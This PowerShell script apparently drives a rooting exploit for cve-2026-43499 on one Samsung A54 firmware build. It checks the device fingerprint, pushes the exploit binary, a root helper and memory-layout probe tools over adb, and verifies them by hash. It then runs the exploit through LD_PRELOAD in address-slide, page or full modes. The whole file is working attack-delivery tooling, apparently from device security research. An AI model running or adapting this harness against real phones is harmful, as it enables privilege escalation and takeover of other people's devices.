param(
    [ValidateSet('probe', 'mcast-probe', 'slide', 'page', 'full')]
    [string]$Mode = 'probe',
    [ValidateSet('mcast', 'sigreturn')]
    [string]$Writer = 'mcast',
    [string]$Adb = "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe"
)

$ErrorActionPreference = 'Stop'
$repoRoot = Split-Path -Parent $PSScriptRoot
$artifactRoot = Join-Path $repoRoot 'build\a54x-A546EXXSKFZF4'
$payload = Join-Path $artifactRoot 'cve-2026-43499'
$helper = Join-Path $artifactRoot 'cve-2026-43499-root'
$perfProbe = Join-Path $artifactRoot 'test-perf-page-oracle'
$mcastProbe = Join-Path $artifactRoot 'test-native-mcast-overlap'
$writerStamp = Join-Path $artifactRoot ".stack-writer-$Writer"

foreach ($path in @($Adb, $payload, $helper, $perfProbe, $mcastProbe, $writerStamp)) {
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {
        throw "Missing file: $path"
    }
}

& $Adb wait-for-device
$fingerprint = (& $Adb shell getprop ro.build.fingerprint).Trim()
if ($fingerprint -notmatch 'A546EXXSKFZF4') {
    throw "Wrong firmware: $fingerprint"
}

$files = @(
    @($payload, '/data/local/tmp/cve-2026-43499'),
    @($helper, '/data/local/tmp/cve-2026-43499-root'),
    @($perfProbe, '/data/local/tmp/test-perf-page-oracle'),
    @($mcastProbe, '/data/local/tmp/test-native-mcast-overlap')
)
foreach ($pair in $files) {
    & $Adb push $pair[0] $pair[1]
    if ($LASTEXITCODE -ne 0) {
        throw "adb push failed: $($pair[0])"
    }
    $localHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $pair[0]).Hash.ToLowerInvariant()
    $remoteHash = ((& $Adb shell "sha256sum $($pair[1])").Trim() -split '\s+')[0].ToLowerInvariant()
    if ($localHash -ne $remoteHash) {
        throw "Hash mismatch: $($pair[1])"
    }
}
& $Adb shell 'chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root /data/local/tmp/test-perf-page-oracle /data/local/tmp/test-native-mcast-overlap'
if ($LASTEXITCODE -ne 0) {
    throw 'chmod failed'
}

switch ($Mode) {
    'probe' {
        & $Adb shell '/data/local/tmp/test-perf-page-oracle'
    }
    'mcast-probe' {
        & $Adb shell '/data/local/tmp/test-native-mcast-overlap'
    }
    'slide' {
        & $Adb shell 'SLIDE_ONLY=1 EXPLOIT_ATTEMPTS=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true'
    }
    'page' {
        & $Adb shell 'PAGE_ONLY=1 EXPLOIT_ATTEMPTS=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true'
    }
    'full' {
        & $Adb shell 'EXPLOIT_ATTEMPTS=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true'
    }
}
if ($LASTEXITCODE -ne 0) {
    throw "Test failed: mode=$Mode exit=$LASTEXITCODE"
}
